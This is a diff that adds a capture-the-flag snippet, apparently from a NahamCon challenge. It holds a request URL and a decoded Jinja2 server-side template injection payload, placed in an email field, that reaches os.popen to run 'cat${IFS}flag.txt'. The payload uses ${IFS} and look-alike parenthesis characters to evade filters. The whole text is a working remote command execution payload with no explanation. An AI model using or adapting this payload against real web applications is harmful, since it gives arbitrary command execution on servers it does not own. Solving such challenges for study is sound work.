@@ -1,0 +1,4 @@
+```
+http://challenge.nahamcon.com:31227/ticket?name=name&email=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen%E2%81%BD%27cat$%7BIFS%7Dflag.txt%27%E2%81%BE.read%E2%81%BD%E2%81%BE%7D%7D%40te/sst.com
+```
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen⁽'cat${IFS}flag.txt'⁾.read⁽⁾}}
